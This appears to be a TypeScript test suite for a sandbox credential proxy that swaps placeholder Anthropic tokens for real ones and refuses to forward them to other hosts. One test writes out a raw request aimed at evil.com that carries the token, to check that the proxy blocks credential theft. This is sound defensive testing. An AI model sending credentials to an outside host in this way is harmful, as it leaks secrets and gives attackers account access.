import { afterEach, expect, test, setDefaultTimeout } from "bun:test";
import { chmod, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { docker } from "../src/index.ts";
import { startCredentialProxy, type CredentialProxy } from "../src/sandboxes/credential-proxy.ts";

setDefaultTimeout(60_000); // see test/setup.ts

const REAL = "sk-ant-oat01-REAL-SECRET";
let proxy: CredentialProxy | undefined;
afterEach(() => proxy?.stop());

function start(seen: Request[] = []) {
  proxy = startCredentialProxy({
    hostname: "127.0.0.1",
    credentials: { CLAUDE_CODE_OAUTH_TOKEN: REAL },
    fetch: async (r) => (seen.push(r), new Response("ok")),
  });
  return proxy;
}

test("the proxy swaps the placeholder for the real credential on api.anthropic.com", async () => {
  const seen: Request[] = [];
  const p = start(seen);
  const res = await fetch(`${p.url}/v1/messages`, { headers: { authorization: `Bearer ${p.placeholders.CLAUDE_CODE_OAUTH_TOKEN}` } });
  expect(res.status).toBe(200);
  expect(seen[0]!.headers.get("authorization")).toBe(`Bearer ${REAL}`);
  expect(new URL(seen[0]!.url).host).toBe("api.anthropic.com");
});

test("the proxy never sends the credential to another host", async () => {
  const seen: Request[] = [];
  const p = start(seen);
  const auth = { authorization: `Bearer ${p.placeholders.CLAUDE_CODE_OAUTH_TOKEN}` };
  for (const path of ["//evil.com/x", "http://evil.com/x"]) {
    const before = seen.length;
    const res = await new Promise<number>((resolve) => {
      const sock = Bun.connect({
        hostname: "127.0.0.1", port: Number(new URL(p.url).port),
        socket: { open(s) { s.write(`GET ${path} HTTP/1.1\r\nHost: evil.com\r\nAuthorization: ${auth.authorization}\r\nConnection: close\r\n\r\n`); }, data(_s, d) { resolve(Number(d.toString().split(" ")[1])); }, error() { resolve(0); } },
      });
      void sock;
    });
    // An absolute-form target still goes to api.anthropic.com only; a host-changing path is refused.
    if (path.startsWith("//")) expect(res).toBe(403);
    else expect(seen.length).toBe(before + 1);
  }
  for (const r of seen) expect(new URL(r.url).host).toBe("api.anthropic.com");
});

test("the proxy rejects a request without the placeholder", async () => {
  const seen: Request[] = [];
  const p = start(seen);
  expect((await fetch(`${p.url}/v1/messages`)).status).toBe(401);
  expect((await fetch(`${p.url}/v1/messages`, { headers: { authorization: "Bearer other" } })).status).toBe(401);
  expect(seen).toEqual([]);
});

test("the agent container's env holds a placeholder, not the real credential", async () => {
  const dir = await mkdtemp(join(tmpdir(), "bunker-fakedocker-"));
  const net = JSON.stringify([{ IPAM: { Config: [{ Gateway: "127.0.0.1" }] } }]);
  await writeFile(join(dir, "docker"), `#!/bin/sh\nif [ "$1" = network ] && [ "$2" = inspect ]; then echo '${net}'; exit 0; fi\nfor a in "$@"; do echo "$a"; done > "${dir}/args"\n`);
  await chmod(join(dir, "docker"), 0o755);
  const saved = { ...process.env };
  Object.assign(process.env, { CLAUDE_CODE_OAUTH_TOKEN: REAL, ANTHROPIC_API_KEY: "sk-ant-api03-REAL-KEY" });
  try {
    await docker({ image: "img", bin: join(dir, "docker") }).exec(["agent"], { worktree: dir, gitCommonDir: join(dir, ".git") });
  } finally {
    process.env.CLAUDE_CODE_OAUTH_TOKEN = saved.CLAUDE_CODE_OAUTH_TOKEN as string;
    if (saved.CLAUDE_CODE_OAUTH_TOKEN === undefined) delete process.env.CLAUDE_CODE_OAUTH_TOKEN;
    if (saved.ANTHROPIC_API_KEY === undefined) delete process.env.ANTHROPIC_API_KEY;
    else process.env.ANTHROPIC_API_KEY = saved.ANTHROPIC_API_KEY;
  }
  const args = await readFile(join(dir, "args"), "utf8");
  expect(args).not.toContain("REAL");
  expect(args).toContain("CLAUDE_CODE_OAUTH_TOKEN=sk-ant-oat01-bunker-placeholder-");
  expect(args).toMatch(/ANTHROPIC_BASE_URL=http:\/\/127\.0\.0\.1:\d+/);
});

test("a gzip-encoded upstream response is readable through the proxy", async () => {
  const upstream = Bun.serve({
    port: 0,
    fetch: () => new Response(Bun.gzipSync("hello from upstream"), { headers: { "content-encoding": "gzip" } }),
  });
  try {
    const p = (proxy = startCredentialProxy({
      hostname: "127.0.0.1",
      credentials: { CLAUDE_CODE_OAUTH_TOKEN: REAL },
      fetch: (r) => fetch(new Request(`http://127.0.0.1:${upstream.port}${new URL(r.url).pathname}`, r)),
    }));
    const res = await fetch(`${p.url}/v1/messages`, { headers: { authorization: `Bearer ${p.placeholders.CLAUDE_CODE_OAUTH_TOKEN}`, "accept-encoding": "gzip" } });
    expect(await res.text()).toBe("hello from upstream");
  } finally {
    upstream.stop(true);
  }
});
